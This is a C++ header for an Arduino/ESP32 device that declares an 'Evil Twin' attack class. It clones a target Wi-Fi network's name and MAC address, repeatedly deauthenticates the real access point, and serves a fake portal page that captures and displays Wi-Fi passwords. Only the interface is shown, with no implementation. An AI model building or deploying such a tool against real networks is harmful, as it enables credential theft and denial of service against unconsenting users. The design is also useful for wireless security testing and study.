#ifndef CAPTIVE_PORTAL_H
#define CAPTIVE_PORTAL_H

#include <Arduino.h>
#include <WiFi.h>
#include "config.h"

// Maximum size for captured passwords buffer
#define MAX_CAPTURED_PASSWORDS 5
#define MAX_PASSWORD_LENGTH 64

// Structure for captured credentials
struct CapturedCredential {
    char ssid[33];
    char password[MAX_PASSWORD_LENGTH];
    unsigned long capturedAt;
    bool displayed;  // Whether it's been shown on OLED yet
};

class CaptivePortal {
public:
    CaptivePortal();

    // Initialize
    void begin();
    
    // Start Evil Twin attack
    // Returns true if AP started successfully
    bool start(const char* targetSSID, uint8_t* targetBSSID = NULL, uint8_t channel = 1);
    
    // Stop Evil Twin attack
    void stop();
    bool isRunning();
    
    // Must be called every loop()
    void update();
    
    // Get captured credentials
    int getCapturedCount();
    const CapturedCredential* getCaptured(int index);
    CapturedCredential* getNewCaptured();  // Get first undisplayed credential
    
    // Check if a credential needs to be shown on OLED
    bool hasNewCapture();
    
    // Mark credential as displayed
    void markDisplayed(int index);
    
    // Get connected client count
    int getClientCount();

private:
    bool _running;
    char _targetSSID[33];
    uint8_t _targetBSSID[6];
    uint8_t _channel;
    
    // Web server
    WiFiServer _server;
    WiFiClient _currentClient;
    bool _clientConnected;
    unsigned long _clientTimeoutMs;
    
    // Captured passwords
    CapturedCredential _capturedPasswords[MAX_CAPTURED_PASSWORDS];
    int _capturedCount;
    int _nextCaptureIndex;  // For circular storage if full
    
    // Timing
    unsigned long _lastDeauthMs;
    uint16_t _deauthIntervalMs;  // Re-deauth original AP periodically
    
    // Client tracking
    int _clientCount;
    
    // Internal methods
    void _startAP();
    void _handleClient();
    void _serveCaptivePortalPage(WiFiClient& client);
    void _serveThankYouPage(WiFiClient& client, const char* password);
    void _serveRedirectPage(WiFiClient& client);
    void _storePassword(const char* password);
    bool _isRedirectRequest(const String& host);
    
    // HTML pages (stored in PROGMEM for RAM efficiency)
    static const char PAGE_INDEX_HTML[];
    static const char PAGE_THANKYOU_HTML[];
    
    // Fake MAC for the cloned AP
    uint8_t _apMAC[6];
    void _generateCloneMAC();
};

#endif
